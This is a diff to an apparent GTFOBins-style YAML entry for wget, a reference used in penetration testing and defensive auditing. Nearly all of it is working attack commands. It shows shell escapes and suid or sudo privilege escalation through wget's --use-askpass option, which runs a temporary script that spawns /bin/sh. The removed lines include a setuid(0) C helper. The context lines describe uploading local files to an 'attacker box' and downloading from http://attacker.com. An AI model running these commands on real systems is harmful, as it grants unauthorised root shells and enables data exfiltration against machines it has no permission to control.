@@ -1,5 +1,11 @@
 ---
 functions:
+  shell:
+    - code: |
+        TF=$(mktemp)
+        chmod +x $TF
+        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+        wget --use-askpass=$TF 0
   file-upload:
     - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
       code: |
@@ -24,32 +30,16 @@ functions:
         URL=http://attacker.com/file_to_get
         LFILE=file_to_save
         wget $URL -O $LFILE
-  shell:
-    - code: |
-        TF=$(mktemp)
-        echo -e '#!/bin/sh\nsh 1>&0 2>&0' > $TF
-        chmod +x $TF
-        wget -v --use-askpass=$TF 0
   suid:
     - code: |
-        TF1=$(mktemp --suffix .c)
-        cat << EOI > $TF1
-        #include <stdio.h>
-        #include <sys/types.h>
-        #include <unistd.h>
-        int main() {
-          setuid(0);
-          setgid(0);
-          system("/bin/sh 1>&0 2>&0");
-        }
-        EOI
-        TF2=$(mktemp)
-        gcc -o $TF2 $TF1
-        wget --use-askpass=$TF2 0
+        TF=$(mktemp)
+        chmod +x $TF
+        echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
+        ./wget --use-askpass=$TF 0
   sudo:
     - code: |
         TF=$(mktemp)
-        echo -e '#!/bin/sh\nsh 1>&0 2>&0' > $TF
         chmod +x $TF
-        sudo wget -v --use-askpass=$TF 0
+        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+        sudo wget --use-askpass=$TF 0
 ---
